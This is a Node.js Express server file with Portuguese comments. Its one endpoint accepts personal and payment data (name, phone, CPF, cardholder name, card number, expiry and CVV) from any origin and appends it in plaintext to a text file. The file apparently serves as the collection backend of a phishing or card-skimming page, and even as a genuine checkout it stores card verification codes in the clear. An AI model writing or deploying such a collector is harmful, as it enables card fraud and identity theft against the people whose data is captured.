const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Habilitar CORS para permitir requisições de outros domínios
app.use(cors());

// Middleware para lidar com JSON e URL-encoded
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Rota para receber os dados do formulário
app.post('/submit', (req, res) => {
    const { nome, telefone, cpf, nomeTitular, numeroCartao, dataValidade, cvv } = req.body;
    const data = `Nome: ${nome}, Telefone: ${telefone}, CPF: ${cpf}, Nome do Titular: ${nomeTitular}, Número do Cartão: ${numeroCartao}, Data de Validade: ${dataValidade}, CVV: ${cvv}\n`;

    // Salvar os dados em um arquivo txt
    fs.appendFile('dados.txt', data, (err) => {
        if (err) {
            console.error('Erro ao salvar os dados:', err);
            res.status(500).send('Erro ao salvar os dados.');
        } else {
            res.send('Dados recebidos com sucesso!');
        }
    });
});

// Iniciar o servidor
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
